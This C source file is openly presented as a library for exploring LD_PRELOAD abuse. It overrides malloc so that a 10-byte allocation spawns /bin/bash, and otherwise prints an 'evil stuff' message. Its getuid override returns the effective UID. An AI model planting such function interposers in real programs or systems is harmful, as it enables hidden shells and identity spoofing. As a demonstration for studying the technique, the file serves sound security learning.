/*
  Copyright (C) 2016 Eric Herman

  A library to explore how LD_PRELOAD can be abused.

  This is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or (at
  your option) any later version.
*/

#include <stddef.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>

/* PROTOTYPES */
void *calloc(size_t nmemb, size_t size);
uid_t geteuid(void);
uid_t geteuid(void);

static void do_evil_stuff(void)
{
	uid_t e_uid;
	gid_t e_gid;

	e_uid = geteuid();
	e_gid = getegid();

	fprintf(stderr, "Doing evil stuff as UID: %lu, GID: %lu!\n",
		(unsigned long int)e_uid, (unsigned long int)e_gid);
}

void exec_bin_bash(void)
{
	char *const argv[1] = { NULL };
	char *const envp[1] = { NULL };

	execve("/bin/bash", argv, envp);
}

void *malloc(size_t size)
{
	if (size == 10) {
		exec_bin_bash();
	} else {
		do_evil_stuff();
	}
	return calloc(1, size);
}

uid_t getuid(void)
{
	do_evil_stuff();
	return geteuid();
}
